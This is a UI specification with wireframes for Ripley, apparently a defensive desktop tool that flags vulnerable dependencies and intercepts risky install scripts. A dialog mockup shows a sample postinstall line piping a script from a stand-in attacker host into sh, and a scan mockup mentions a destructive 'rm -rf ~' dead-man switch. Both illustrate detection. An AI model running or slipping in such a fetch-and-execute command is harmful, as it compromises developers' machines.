# UI

Views, wireframes, and interaction specifications for Ripley. This
document defines what appears on screen and how users interact with it.
For the design system (colors, typography, spacing, components), see
[DESIGN.md](DESIGN.md). For component picks per workflow and keyboard
model, see [UX_DESIGN.md](UX_DESIGN.md). For system architecture, see
[ARCHITECTURE.md](ARCHITECTURE.md). For user workflows, see
[WORKFLOW.md](WORKFLOW.md). For settings, see [SETTINGS.md](SETTINGS.md).


## Principles

1. **Severity drives hierarchy.** Critical findings dominate the view.
   Low-risk items recede. The developer's eye goes to what matters most.

2. **Every view has a next action.** No dead-end screens. Alerts have
   [Fix]. Scan results have [Remediate]. Guard blocks have [Inspect].
   The UI always answers "what do I do now?"

3. **Show, don't obscure.** Display matched lines, file paths, version
   ranges --- the raw signal that justifies a finding. Developers trust
   tools they can verify.

4. **Low intrusion, high urgency.** The tray app is invisible until
   something needs attention. When it surfaces, the severity is
   immediately clear.

5. **Terminal-adjacent.** Dark palette, monospace where appropriate,
   information-dense. This is a developer tool, not a consumer app.


---


## Tray Icon

The tray icon is a small monochrome glyph (template image on macOS).
It reflects overall status:

| State    | Icon variant        | Meaning                            |
|----------|---------------------|------------------------------------|
| Idle     | Shield outline      | Monitoring, no findings            |
| Alert    | Shield with dot     | Unacknowledged alerts exist        |
| Critical | Shield with !       | Critical-severity alert            |
| Paused   | Shield with pause   | Monitoring paused (offline/config) |

On macOS, use template images so the icon adapts to light/dark menu
bar automatically.


## Tray Menu

Right-click (or control-click) opens a context menu. Single-click on
the tray icon opens the dashboard window.

```
┌─────────────────────────┐
│ ● Monitoring 12 projects│
│─────────────────────────│
│   Show Dashboard        │
│   Scan Now...           │
│─────────────────────────│
│   Quit Ripley           │
└─────────────────────────┘
```

The menu is intentionally minimal. Everything else lives in the
dashboard window.


---


## Notifications

Native OS notifications via `notify-rust`. Three variants match the
three-phase model. Clicking the notification body opens the dashboard
to the relevant alert or scan report.

**Before** (advisory match):

```
┌──────────────────────────────────────────┐
│  Ripley                                  │
│                                          │
│  lodash@4.17.20 is vulnerable            │
│  GHSA-xxxx · Prototype Pollution · High  │
│  Affects: ~/src/myapp                    │
│                                          │
│  [Fix]  [View]  [Dismiss]               │
└──────────────────────────────────────────┘
```

**During** (active compromise):

```
┌──────────────────────────────────────────┐
│  Ripley · CRITICAL                       │
│                                          │
│  Suspicious process detected             │
│  node (PID 12345) → 185.x.x.x:443      │
│  Writing to ~/.claude/settings.json      │
│                                          │
│  [Contain]  [View]  [Investigate]        │
└──────────────────────────────────────────┘
```

**After** (scan results):

```
┌──────────────────────────────────────────┐
│  Ripley · Deep Scan Complete             │
│                                          │
│  3 findings · 2 credentials at risk      │
│  IOC files detected in ~/src/myapp       │
│                                          │
│  [Remediate]  [View Report]              │
└──────────────────────────────────────────┘
```


---


## Dashboard

The main window. Default size: 900 x 640. Minimum: 720 x 480.
Opened by clicking the tray icon or a notification. Closing the
window hides it (does not quit --- the tray icon stays active).

### Layout

Sidebar navigation on the left (200px), content area on the right.

```
┌────────┬────────────────────────────────────────────────────────┐
│        │                                                        │
│  LOGO  │  Ripley                  ● Monitoring · 12 projects   │
│        │                          Last poll: 2m ago            │
│────────│────────────────────────────────────────────────────────│
│        │                                                        │
│▶Alerts │  ┌─ Alerts (8) ────────────────────────────────────┐  │
│   (8)  │  │                                                  │  │
│        │  │  ● CRIT  lodash@4.17.20                          │  │
│        │  │         GHSA-xxxx · Prototype Pollution           │  │
│ Guard  │  │         ~/src/myapp · 2m ago            [Fix]    │  │
│   (3)  │  │                                                  │  │
│        │  │  ● HIGH  express@4.17.1                          │  │
│   ⚙    │  │         GHSA-yyyy · Path Traversal               │  │
│Settings│  │         ~/src/api · 1h ago              [Fix]    │  │
│        │  │                                                  │  │
│        │  │  ● MED   minimist@1.2.5                          │  │
│        │  │         GHSA-zzzz · Prototype Pollution           │  │
│        │  │         ~/src/tools · 3h ago         [Dismiss]   │  │
│        │  │                                                  │  │
│        │  │  ● LOW   semver@7.5.3                            │  │
│        │  │         GHSA-wwww · ReDoS                        │  │
│        │  │         ~/src/myapp · 1d ago         [Dismiss]   │  │
│        │  │                                                  │  │
│        │  └──────────────────────────────────────────────────┘  │
│        │                                                        │
│ v0.1.0 │  [Scan Now]  [Deep Scan]                               │
│ ● Live │                                                        │
└────────┴────────────────────────────────────────────────────────┘
```

### Sidebar

Fixed-width left column. Contains:

1. **Logo / app name** --- top of sidebar.
2. **Alerts** --- badge shows unacknowledged count. Default view.
3. **Guard** --- badge shows recent interception count.
4. **Monitor** --- Phase 4. Disabled with tooltip until `[monitor] enabled`.
5. **Settings** --- gear icon, no badge.
6. **Status** --- bottom of sidebar: version, connection indicator.

Active section is highlighted with `accent` color and a left border.

### Alerts View (default)

The primary view. All current findings sorted by severity (critical
first), then by recency.

Each alert row shows:
- Severity badge (colored dot + label)
- Package name @ version (monospace)
- Advisory ID + summary (secondary text)
- Project path (monospace, secondary)
- Time since detection
- Primary action: [Fix] for high+, [Dismiss] for low

Click a row to expand the alert detail panel.

**Empty state:** "No findings. Your dependencies look clean." with a
green shield icon and a [Scan Now] button.

### Guard Log View

Recent package manager interceptions from `guard.jsonl`.

```
┌─ Guard Log ──────────────────────────────────────────────────┐
│                                                               │
│  TIME   PACKAGE                 SCRIPT        RISK   ACTION  │
│  ─────────────────────────────────────────────────────────── │
│  12:04  @example/pkg@1.2.3     postinstall   ● HIGH blocked │
│  12:01  express@4.18.0         postinstall   ● LOW  allowed │
│  11:58  typescript@5.4.0       (none)               clean   │
│  11:55  lodash@4.17.21         postinstall   ● LOW  allowed │
│  11:42  esbuild@0.21.0         postinstall   ● MED  allowed │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

Each row is expandable to show matched rules and script excerpt.

### Settings View

Structured form that reads and writes `config.toml`. Changes save
immediately (no Save button). Writes are atomic (temp file + rename),
preserving the file as the human-editable source of truth. See
[SETTINGS.md](SETTINGS.md) for the full list of configurable options.

```
┌─ Settings ───────────────────────────────────────────────────┐
│                                                               │
│  General                                                      │
│  ──────                                                      │
│  Poll interval        [5 minutes      ▾]                     │
│  AI harness           [Auto-detect    ▾]  (claude found)     │
│  Launch at login      [●]                                    │
│                                                               │
│  Monitoring                                                   │
│  ──────────                                                  │
│  Project roots                                               │
│  ┌────────────────────────────────────────────────┐          │
│  │ ~/src                                      [✕] │          │
│  │ ~/work                                     [✕] │          │
│  └────────────────────────────────────────────────┘          │
│  [+ Add root]                                                │
│                                                               │
│  Guard                                                        │
│  ─────                                                       │
│  Mode                 (●) Strict  ( ) Audit  ( ) Off         │
│  Trusted packages                                            │
│  ┌────────────────────────────────────────────────┐          │
│  │ @tanstack/*                                [✕] │          │
│  │ typescript                                 [✕] │          │
│  │ esbuild                                    [✕] │          │
│  └────────────────────────────────────────────────┘          │
│  [+ Add trust]                                               │
│                                                               │
│  Posture                                                      │
│  ───────                                                     │
│  Require lockfile       [●]                                  │
│  Require exact versions [●]                                  │
│  Require integrity      [ ]                                  │
│  Block exotic sources   [●]  (git+, http://, file:)          │
│  Strict mode            [ ]  (warnings become errors)        │
│                                                               │
│  Advanced                                                     │
│  ────────                                                    │
│  Config file     ~/.config/ripley/config.toml   [Open]       │
│  Rules dir       ~/.config/ripley/rules/  (3 custom rules)  │
│  IOC profiles    ~/.config/ripley/iocs/  (2 profiles)        │
│  Guard log       ~/.local/share/ripley/guard.jsonl           │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```


---


## Alert Detail

Displayed when clicking an alert row. Slides in as a panel on the
right side of the alerts list, replacing the list's right half (or
expanding the window width on narrow screens).

```
┌─ Alert Detail ───────────────────────────────────────────────┐
│                                                               │
│  ● CRITICAL                                       [Dismiss]  │
│                                                               │
│  lodash@4.17.20                                              │
│  ─────────────────────────────────────────                   │
│                                                               │
│  Advisory    GHSA-xxxx-yyyy-zzzz                             │
│  CVE         CVE-2026-12345                                  │
│  Severity    Critical (CVSS 9.8)                             │
│  Fixed in    4.17.21                                         │
│  Published   2026-05-10                                      │
│                                                               │
│  Summary                                                      │
│  Prototype Pollution in lodash allows remote code            │
│  execution via crafted object properties...                  │
│                                                               │
│  Affected projects                                           │
│  ┌────────────────────────────────────────────────┐          │
│  │ ~/src/myapp/package-lock.json    lodash 4.17.20│          │
│  │ ~/src/tools/package-lock.json    lodash 4.17.19│          │
│  └────────────────────────────────────────────────┘          │
│                                                               │
│  IOC files to check                                          │
│  (none known for this advisory)                              │
│                                                               │
│  [Fix with Claude]  [Fix with Codex]                         │
│  [View Advisory]    [Copy Prompt]                            │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

Key elements:
- Advisory ID, CVE, severity with CVSS score
- Fixed version (what to upgrade to)
- List of affected projects on this machine
- IOC files to check (if the advisory has associated IOCs)
- Action buttons: Fix (with harness selection), View Advisory (opens
  URL in browser), Copy Prompt (copies remediation prompt to clipboard)


---


## Guard Interception Dialog

When `ripley-script-shell` encounters a medium+ risk script during
install, a dialog appears. If the tray app is running, the script-shell
sends an IPC request and the tray app shows a native dialog. If the
tray app is not running, falls back to the terminal prompt (same
information, text-only).

```
┌─ Script Flagged ─────────────────────────────────────────────┐
│                                                               │
│  ● HIGH RISK                                                 │
│  @example/pkg@1.2.3 · postinstall                            │
│                                                               │
│  ┌─ Script ────────────────────────────────────────────────┐ │
│  │  1  #!/bin/sh                                           │ │
│  │  2  curl -s https://evil.com/payload.sh | sh  ← ● HIGH │ │
│  │  3  node ./setup.js                                     │ │
│  └─────────────────────────────────────────────────────────┘ │
│                                                               │
│  Matched rules:                                              │
│  ● HIGH  network_call — curl to external URL                 │
│  ● HIGH  pipe_to_shell — piped output to shell execution     │
│                                                               │
│  [Allow Once]  [Block]  [Always Trust]  [Inspect]            │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

Behavior:
- Shows the full script with line numbers.
- Highlights matched lines with severity indicators.
- Lists matched rules with descriptions.
- [Allow Once] executes this script, does not remember the decision.
- [Block] fails the install (exit 1).
- [Always Trust] adds the package to `config.toml` trust list.
- [Inspect] opens the full analysis in the dashboard.
- 30-second timeout defaults to Block (fail-safe).
- Decision is logged to `guard.jsonl`.


---


## Deep Scan Report

Displayed in the dashboard after `ripley scan --deep` completes.
Navigated to via the "After" notification or via CLI trigger through
IPC.

```
┌─ Deep Scan Report ───────────────────────────────────────────┐
│                                                               │
│  Scanned: ~/src/myapp                  2026-05-12 12:04      │
│                                                               │
│  ┌───────┐ ┌───────┐ ┌────────┐ ┌───────────┐ ┌───────┐     │
│  │   3   │ │   2   │ │   1    │ │     2     │ │   1   │     │
│  │ Vulns │ │ IOCs  │ │Persist.│ │Creds Risk │ │  MCP  │     │
│  └───────┘ └───────┘ └────────┘ └───────────┘ └───────┘     │
│                                                               │
│  ─ Vulnerabilities ──────────────────────────────────────    │
│  ● CRIT  lodash@4.17.20               GHSA-xxxx              │
│  ● HIGH  express@4.17.1               GHSA-yyyy              │
│  ● MED   minimist@1.2.5               GHSA-zzzz              │
│                                                               │
│  ─ IOC Files Found ──────────────────────────────────────    │
│  ● CRIT  .claude/execution.js              present           │
│  ● CRIT  .claude/setup.mjs                 present           │
│    —     .vscode/tasks.json                clean             │
│                                                               │
│  ─ Persistence ──────────────────────────────────────────    │
│  ● HIGH  ~/.zshrc contains eval of remote script             │
│  ● HIGH  .mcp.json contains rogue MCP server definition      │
│    —     LaunchAgents                      clean             │
│    —     crontab                           clean             │
│                                                               │
│  ─ Credentials at Risk ──────────────────────────────────    │
│  ● HIGH  ~/.npmrc (npm token)                                │
│          → npm token revoke && npm login                     │
│  ● HIGH  ~/.aws/credentials                                  │
│          → aws iam create-access-key (after revoke)          │
│                                                               │
│  ─ MCP Config ───────────────────────────────────────────    │
│  ● HIGH  .mcp.json contains rogue server definition          │
│          Tool descriptions contain prompt injection           │
│    —     .cursor/mcp.json                  clean             │
│                                                               │
│  ┌─ ⚠ Dead Man Switch Detected ──────────────────────────┐  │
│  │  Credential monitor found in persistence scan.         │  │
│  │  Revoking tokens may trigger destructive actions       │  │
│  │  (e.g., rm -rf ~). Before rotating credentials:        │  │
│  │                                                        │  │
│  │  1. Back up your home directory                        │  │
│  │  2. Disable network access on this machine             │  │
│  │  3. Then rotate credentials from a different device    │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                               │
│  [Remediate All]  [Export Report]  [Copy Rotation Checklist] │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

Summary cards at top show counts by category with severity-colored
backgrounds. Sections are collapsible. Each section uses the same
severity color system.

**Action buttons:**
- **[Remediate All]** --- generates remediation prompts for all findings
  and launches the AI harness. Same behavior as clicking [Fix] on each
  finding individually, but batched into a single prompt.
- **[Export Report]** --- writes the full report to a JSON file at
  `{data_dir}/reports/scan-{timestamp}.json`. Opens a system save dialog
  if the user wants a custom location. JSON format matches `--format json`
  output.
- **[Copy Rotation Checklist]** --- copies the credential rotation commands
  to the system clipboard as plain text, one command per line. A toast
  notification confirms "Rotation checklist copied."


---


## First Run & Empty States

When a user opens the dashboard for the first time (or with no findings),
the UI should communicate status clearly without dead ends.

### First run (no config)

Shown when `config.toml` doesn't exist or `project_roots` is empty.

```
┌────────┬────────────────────────────────────────────────────────┐
│        │                                                        │
│  LOGO  │  Ripley                  ○ Not monitoring              │
│        │                                                        │
│────────│────────────────────────────────────────────────────────│
│        │                                                        │
│  Alerts│                                                        │
│        │  ┌──────────────────────────────────────────────────┐  │
│  Guard │  │                                                  │  │
│        │  │             Welcome to Ripley                    │  │
│   ⚙    │  │                                                  │  │
│Settings│  │  Get started in three steps:                     │  │
│        │  │                                                  │  │
│        │  │  1. Add your project directories                 │  │
│        │  │     [Add Project Root]                           │  │
│        │  │                                                  │  │
│        │  │  2. Install the package manager guard            │  │
│        │  │     ripley guard install                         │  │
│        │  │                                                  │  │
│        │  │  3. Run your first scan                          │  │
│        │  │     [Scan Now]                                   │  │
│        │  │                                                  │  │
│        │  └──────────────────────────────────────────────────┘  │
│        │                                                        │
│ v0.1.0 │                                                        │
│ ○ Idle │                                                        │
└────────┴────────────────────────────────────────────────────────┘
```

### Alerts empty state

When monitoring is active but no findings exist.

```
┌─ Alerts ────────────────────────────────────────────────────┐
│                                                              │
│                     ● (green shield)                         │
│                                                              │
│              No findings. Your dependencies                  │
│              look clean.                                     │
│                                                              │
│              Monitoring 12 projects.                         │
│              Last poll: 2m ago.                               │
│                                                              │
│              [Scan Now]  [Deep Scan]                         │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```


---


## Error States

### Network failure

When polling fails or scan can't reach OSV.dev.

```
┌──────────────────────────────────────────┐
│  Ripley                                  │
│                                          │
│  Advisory feed unavailable               │
│  Using cached data (3 hours old)         │
│  Retrying in 2 minutes                   │
│                                          │
└──────────────────────────────────────────┘
```

In the dashboard, a warning banner appears below the header:

```
│ ⚠ Advisory feeds unreachable. Using cached data (3h old). Retrying...  │
```

### IPC unavailable (CLI)

When the CLI can't reach the tray daemon via socket:

```
$ ripley status
Daemon:    not running
Cache:     advisories.redb (2h old)
Guard:     installed (npm shim active)
Projects:  3 configured in config.toml

Tip: launch Ripley.app or run `ripley watch` for continuous monitoring.
```

### No lockfiles found

Different from "no findings" --- there's nothing to scan.

```
┌─ Scan Results ──────────────────────────────────────────────┐
│                                                              │
│  No lockfiles found in ~/src/newproject                      │
│                                                              │
│  Ripley looks for:                                           │
│  • package-lock.json (npm)                                   │
│  • yarn.lock (Yarn)                                          │
│  • pnpm-lock.yaml (pnpm)                                    │
│  • Cargo.lock (Rust)                                         │
│  • go.sum (Go)                                               │
│  • Gemfile.lock (Ruby)                                       │
│                                                              │
│  Make sure you're scanning a directory with dependencies     │
│  installed.                                                  │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### Guard dialog timeout

The guard dialog shows a countdown timer when waiting for user input.
Default timeout: 30 seconds, defaults to Block (fail-safe).

```
┌─ Script Flagged ───────────────────────────── ⏱ 12s ────────┐
│                                                               │
│  ● HIGH RISK                                                 │
│  @example/pkg@1.2.3 · postinstall                            │
│  ...                                                         │
│  [Allow Once]  [Block (default in 12s)]  [Always Trust]      │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

The countdown is visible in the title bar and on the Block button. When
the timer reaches 0, the dialog auto-dismisses with Block.


---


## Scan Results

Regular `ripley scan` results (not `--deep`) surface as entries in the
**Alerts view**. There is no separate "scan results" view. When a scan
completes (from the tray menu "Scan Now" button, or from `ripley scan`
with the daemon running), new findings are added to the alerts list and
the user sees them sorted by severity alongside any existing alerts.

If the scan was triggered from the tray menu, the dashboard opens
automatically to the alerts view. If triggered from the CLI, results
appear in the terminal output and are also sent to the daemon via IPC
(if running) for display in the dashboard.


---


## Audit Report View (Phase 3)

Displayed in the dashboard after `ripley audit` completes. Traffic-light
summary per category with expandable finding details.

```
┌─ Environment Audit ─────────────────────────────────────────┐
│                                                               │
│  Scanned: developer environment       2026-05-12 12:04       │
│                                                               │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐        │
│  │ Machine  │ │Toolchain │ │ AI Tools │ │  Creds   │        │
│  │   ██░░   │ │   ███░   │ │   ██░░   │ │   ██░░   │        │
│  │  1R 1Y   │ │   1Y     │ │   1R     │ │  1R 1Y   │        │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘        │
│                                                               │
│  ─ Machine Security ─────────────────────────────────────    │
│  ● CRIT  FileVault: disabled                                 │
│          → sudo fdesetup enable                              │
│  ● MED   OS updates: 2 pending                               │
│          → softwareupdate -ia                                │
│    ✓     Firewall: active                                    │
│    ✓     Screen lock: 5 min                                  │
│                                                               │
│  ─ Developer Toolchain ──────────────────────────────────    │
│  ● MED   Git signing: not configured                         │
│          → git config --global commit.gpgsign true           │
│    ✓     SSH keys: Ed25519, passphrase set                   │
│    ✓     Shell RC: clean                                     │
│                                                               │
│  ─ AI Tool Config ───────────────────────────────────────    │
│  ● CRIT  .cursor/mcp.json: 1 rogue server                   │
│          → remove "sus-server" from .cursor/mcp.json         │
│    ✓     .claude/settings.json: no hooks                     │
│    ✓     .mcp.json: not present                              │
│                                                               │
│  ─ Credential Exposure ──────────────────────────────────    │
│  ● CRIT  npm tokens: broadly scoped (no expiry)             │
│          → npm config set //registry.npmjs.org/:_authToken   │
│  ● MED   shell history: 2 tokens found                      │
│          → history -c && add HISTIGNORE pattern              │
│    ✓     .env in git: none found                             │
│                                                               │
│  [Fix All with Claude]  [Export Report]                       │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

Each finding row shows severity, description, and a fix command. Green
check marks for passing checks. Sections with all-green are collapsed by
default.


---


## Posture & Hardening View (Phase 3)

Displayed after `ripley harden` or accessible from the settings view.
Shows PM-specific hardening recommendations.

```
┌─ PM Hardening ──────────────────────────────────────────────┐
│                                                               │
│  Detected: npm 11.2, pnpm 10.4                               │
│                                                               │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐        │
│  │ Pinning  │ │ Hardening│ │Provenance│ │  Creds   │        │
│  │   ███░   │ │   ██░░   │ │   ███░   │ │   ██░░   │        │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘        │
│                                                               │
│  ─ Dependency Pinning ───────────────────────────────────    │
│  ● MED   save-exact: not set                                 │
│          → npm config set save-exact true                    │
│    ✓     lockfile: committed                                 │
│  ● MED   integrity hashes: 412/459 present                   │
│          → npm i --package-lock-only (regenerate lockfile)   │
│    ✓     exotic sources: none                                │
│                                                               │
│  ─ PM Hardening ─────────────────────────────────────────    │
│  ● CRIT  minimumReleaseAge: not set                          │
│          → npm config set minReleaseAge 86400                │
│  ● MED   ignore-scripts: not set                             │
│          → npm config set ignore-scripts true                │
│  ● MED   pnpm blockExoticSubdeps: not set                    │
│          → pnpm config set blockExoticSubdeps true           │
│    ✓     pnpm trustPolicy: no-downgrade                      │
│                                                               │
│  ─ Provenance ───────────────────────────────────────────    │
│  ● MED   trusted publishing: not configured                  │
│          → configure OIDC in your publish CI workflow         │
│    ✓     provenance drops: none detected                     │
│                                                               │
│  ─ Credential Hygiene ───────────────────────────────────    │
│  ● CRIT  .npmrc tokens: broadly scoped                       │
│          → npm token create --cidr=... --scope=@myorg        │
│    ✓     project .npmrc: clean                               │
│                                                               │
│  [Copy All Commands]                                          │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```


---


## Monitor View (Phase 4)

Active detection dashboard. Shows live process and filesystem monitoring
when `ripley monitor` or the tray daemon's monitor mode is active.

```
┌─ Monitor ───────────────────────────────────────────────────┐
│                                                               │
│  ● Active     Watching 12 projects     Uptime: 2h 34m        │
│                                                               │
│  ─ Recent Activity ──────────────────────────────────────    │
│                                                               │
│  TIME   EVENT                              STATUS             │
│  ─────────────────────────────────────────────────────────   │
│  12:04  node → 185.x.x.x:443              ● CRIT  contained │
│  12:01  .claude/settings.json written      ● HIGH  alerted   │
│  11:58  lockfile edit (no install)         ● MED   logged    │
│  11:42  python → pypi.org (expected)         —     allowed   │
│                                                               │
│  ─ Contained Processes ──────────────────────────────────    │
│                                                               │
│  PID    PROCESS    REASON                    SNAPSHOT         │
│  ─────────────────────────────────────────────────────────   │
│  12345  node       C2 connection            [View Snapshot]  │
│                                                               │
│  ─ Watched Paths ────────────────────────────────────────    │
│                                                               │
│  ~/.claude/settings.json      last check: 2m ago     clean   │
│  ~/.vscode/tasks.json         last check: 2m ago     clean   │
│  ~/.zshrc                     last check: 2m ago     clean   │
│  .mcp.json                    last check: 2m ago     clean   │
│  ~/Library/LaunchAgents/      last check: 5m ago     clean   │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

The monitor view is only available when the daemon is running with
`[monitor] enabled = true`. Otherwise, the sidebar item shows as disabled
with a tooltip: "Enable in Settings > Monitor."


---


## Technology

### Stack: Tauri 2 + React 19 + shadcn/ui (Base UI) + Tailwind v4

Full rationale and version locks in [STACK_DECISION.md](STACK_DECISION.md).
Short version:

- **Cross-platform first-class.** Single codebase ships macOS + Linux + Windows.
  No second GUI stack to maintain.
- **First-party tray on all 3 OSes.** Tauri's `TrayIconBuilder` wraps
  `NSStatusItem` (macOS), `Shell_NotifyIcon` (Windows), `StatusNotifierItem`
  (Linux). No bolt-on glue, no event-loop wrestling.
- **DOM accessibility tree preserved.** WebView exposes the full AX tree on
  every platform — the Peekaboo `see` / `click` design loop keeps working, and
  WebdriverIO + `tauri-driver` provides e2e on Linux + Windows.
- **Component depth + designer hireability.** shadcn/ui (Base UI primitive) +
  Tailwind v4 + DESIGN.md tokens give us a copy-into-repo terminal-density
  aesthetic without fighting an opinionated library. React + Tailwind is the
  industry-standard 2026 frontend stack.

The Phase 1-5 `crates/ripley-app` (iced + tray-icon + muda) is retired in Phase
6 M28; it was eliminated by the cross-platform-v1 constraint (no first-party
tray story; no AX tree).

### Tray + window integration

```
Tauri main process (Rust)
    │
    ├── TrayIconBuilder (per-OS: NSStatusItem / Shell_NotifyIcon / StatusNotifierItem)
    │       ├── icon click  → window.show()  (pre-warmed, hidden since startup)
    │       ├── menu "Scan Now"  → invoke scan command
    │       └── menu "Quit"  → app.exit()
    │
    └── WebView (React 19 SPA)
            │
            ├── tauri::invoke → typed via tauri-specta bindings
            ├── window.event::<T>() listeners (push from Rust → React)
            └── TanStack Query caches IPC results; invalidates on events
```

On startup the app launches with `set_activation_policy(.Accessory)` on macOS
(no Dock icon) and a hidden pre-warmed window so the first show is <500ms.
Subsequent shows are <50ms.

### Type-safe IPC (tauri-specta v2)

`#[tauri::command]` handlers in `apps/desktop/src-tauri/src/commands/` are
annotated with `specta::Type` on their DTOs. A `build.rs` step emits
`apps/desktop/src/lib/bindings.ts` at build time. The frontend imports
`commands.scan()` and calls it as a typed function — no hand-written
`invoke<T>("scan")` calls. Generated bindings are committed to the repo (same
principle as `Cargo.lock`).

### Guard dialog via IPC

The `ripley-script-shell` binary is unchanged from Phase 1-5. When the desktop
app is running, it sends an IPC request over the Unix socket; the desktop app
bridges that into a Tauri event, renders the dialog via shadcn's `Dialog` on
Base UI, and returns the user's response over the same socket.

```
ripley-script-shell
    │
    ├── connect to {data_dir}/ripley.sock
    │       ├── connected → send GuardPrompt request
    │       │                 ├── desktop app shows shadcn Dialog (Base UI)
    │       │                 └── returns Allow | Block | Trust
    │       └── not running → fall back to terminal prompt
    │
    └── execute or block based on response
```

The UDS protocol (`ripley-ipc` crate) is unchanged. Only the GUI consumer
changes — the script-shell binary remains UI-dependency-free and works against
either the iced (Phase 1-5) or Tauri (Phase 6+) desktop app.


---


## Milestone Map

Which views ship in which milestone. Phase 1-5 (M3, M5, M11, M13, M18) shipped
on iced + `tray-icon` + `muda`. **Phase 6 M24-M27 re-implements these views in
Tauri + React + shadcn/Base UI**, in the priority order from
[DESIGN_ISSUES.md](DESIGN_ISSUES.md).

| View                       | Phase 1-5 (iced, shipped) | Phase 6 (Tauri rewrite) | Notes                            |
|----------------------------|---------------------------|-------------------------|----------------------------------|
| Tray icon + menu           | M3                        | M24                     | Tauri `TrayIconBuilder` (per-OS) |
| Notifications (3 variants) | M3                        | M24                     | Tauri `notification` plugin      |
| Dashboard: sidebar + nav   | M3                        | M27                     | App shell in `App.tsx`           |
| Dashboard: alerts view     | M3                        | M27                     | `AlertCard` + severity-sorted    |
| Alert detail panel         | M3                        | M27                     | shadcn `Sheet` (slide-in)        |
| Dashboard: guard log view  | M3                        | M27                     | shadcn `DataTable` + TanStack    |
| Settings view              | M3                        | M27                     | shadcn forms over config.toml    |
| Guard interception dialog  | M3                        | **M25**                 | Primary critical path: <500ms    |
| First-run onboarding       | M3                        | M27                     | Welcome screen                   |
| Empty state (alerts)       | M3                        | M27                     | Green shield, "no findings"      |
| Error states (network, IPC)| M3                        | M27                     | shadcn `Alert` banners           |
| Deep scan report view      | M5                        | M27                     | Findings tree                    |
| Audit report view          | M10 (Phase 3)             | M27                     | Traffic-light output             |
| Posture view (harden)      | M11 (Phase 3)             | M27                     | PM-specific hardening recs       |
| Monitor view               | M18 (Phase 4)             | M27                     | Subscribe to IPC alerts via Query |
| Command palette (Cmd+K)    | (new)                     | M24 scaffold, M27 wire  | Base UI `Combobox` + `match-sorter` |
